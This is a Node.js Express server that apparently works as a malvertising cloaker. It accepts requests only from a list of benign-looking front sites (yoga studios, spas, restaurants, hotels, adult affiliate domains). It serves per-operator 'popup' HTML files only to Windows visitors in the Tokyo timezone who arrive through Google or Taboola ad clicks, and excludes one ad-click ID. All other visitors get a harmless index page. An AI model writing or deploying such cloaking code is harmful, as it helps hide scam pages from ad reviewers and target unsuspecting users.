const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;

const officeList1 = ["spadelightjapan", "tanenespa"];
const officeList2 = ["hdjavforyou", "javhdaffiliates"];
const officeList3 = [];
const officeList4 = [];
const officeList5 = [];

const dmcList1 = ["seishinyoga", "yuyado-onsen", "foodhutjapan", "komorebiyoga"];;
const dmcList2 = [];
const dmcList3 = [];
const dmcList4 = [];
const dmcList5 = [];

const aomineList1 = ["nursecares", "expressmealdelivery", "yogalhealing", "gourmethub", "omnifoodss"];
const aomineList2 = [];
const aomineList3 = [];
const aomineList4 = [];
const aomineList5 = [];

const wayneList1 = [];
const wayneList2 = [];
const wayneList3 = [];
const wayneList4 = ["ruijiacoaching.onrender.com", "delightful-smakager-b5ed06.netlify.app", "oceanrestaurant.onrender.com", "kokoroyoga.onrender.com", "goldenflowerhotel.onrender.com", "matsucafe.onrender.com", "summerlighthotel"];
const wayneList5 = [];

// Base domains for allowed origins and referrers
const baseDomains = [
  "foodhutjapan.netlify.app",
  "tanenespa.onrender.com",
  "yuyado-onsen.com",
  "komorebiyoga.onrender.com",
  "spadelightjapan.fit",
  "javhdaffiliates.site",
  "seishinyoga.com",
  "hdjavforyou.online",
  "yumimasseuse.shop",
  "expressmealdelivery.shop",
  "hanasakuniwa.shop",
  "omnifoodss.shop",
  "gourmethubeats.shop",
  "yogahealing.netlify.app",
  "nursecares.netlify.app",
  "ruijiacoaching.onrender.com",
  "gourmethub.netlify.app",
  "oceanrestaurant.onrender.com",
  "kokoroyoga.onrender.com",
  "delightful-smakager-b5ed06.netlify.app",
  "goldenflowerhotel.onrender.com",
  "matsucafe.onrender.com",
  "summerlighthotel.club",
];

// Generate all combinations of allowed URLs
const generateAllowedUrls = (domains) => {
  const protocols = ["https://", "http://"];
  const www = ["", "www."];
  const urls = [];
  domains.forEach(domain => {
    protocols.forEach(protocol => {
      www.forEach(prefix => {
        urls.push(`${protocol}${prefix}${domain}`);
      });
    });
  });
  return urls;
};

const allowedUrls = generateAllowedUrls(baseDomains);

// Normalize referer to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Check if the user's OS is Windows
const isWindowsOS = (userAgent) => userAgent.includes("Windows");

// CORS configuration
const corsOptions = {
  origin: (origin, callback) => {
    if (allowedUrls.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  }
};

// Apply the CORS middleware
app.use(cors(corsOptions));
app.use(express.json());

// List of excluded GCLIDs
const excludedGclids = [
  "Cj0KCQjw-r-vBhC-ARIsAGgUO2C_TQANjVz_anWRFDMLrgWjPRQdR_Jut7w9ET3Vjk5u0k8R6QcOxBkaAgb8EALw_wcB",
];

// Check if the URL contains any of the excluded GCLIDs
const containsExcludedGclid = (url) => excludedGclids.some(gclid => url.includes(gclid));

// Route to handle the POST request
app.post("/", (req, res) => {
  const referer = normalizeReferer(req.headers.referer);
  const userAgent = req.headers["user-agent"];
  const { timezone, fullUrl } = req.body;

  console.log(req.body);
  console.log(`Referer: ${referer}, User-Agent: ${userAgent}`);
  
  const isTokyoTimezone = timezone === "Asia/Tokyo" || timezone === "Etc/GMT-9";
  console.log(`Is Tokyo/Asia Timezone: ${isTokyoTimezone}`);

  if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes('gclid') || fullUrl?.includes('taboola') || fullUrl?.includes('tx'))) {
    console.log('popupsent');
    if (officeList1.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "officeList1.html"));
    } else if (officeList2.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "officeList2.html"));
    } else if (officeList3.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "officeList3.html"));
    } else if (officeList4.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "officeList4.html"));
    } else if (officeList5.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "officeList5.html"));
    } else if (dmcList1.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "dmcList1.html"));
    } else if (dmcList2.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "dmcList2.html"));
    } else if (dmcList3.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "dmcList3.html"));
    } else if (dmcList4.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "dmcList4.html"));
    } else if (dmcList5.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "dmcList5.html"));
    } else if (aomineList1.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "aomineList1.html"));
    } else if (aomineList2.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "aomineList2.html"));
    } else if (aomineList3.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "aomineList3.html"));
    } else if (aomineList4.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "aomineList4.html"));
    } else if (aomineList5.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "aomineList5.html"));
    } else if (wayneList1.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "wayneList1.html"));
    } else if (wayneList2.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "wayneList2.html"));
    } else if (wayneList3.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "wayneList3.html"));
    } else if (wayneList4.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "wayneList4.html"));
    } else if (wayneList5.some(item => fullUrl.includes(item))) {
      res.sendFile(path.join(__dirname, "wayneList5.html"));
    }
  } else {
    console.log('popup not sent');
    res.sendFile(path.join(__dirname, "index.html"));
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
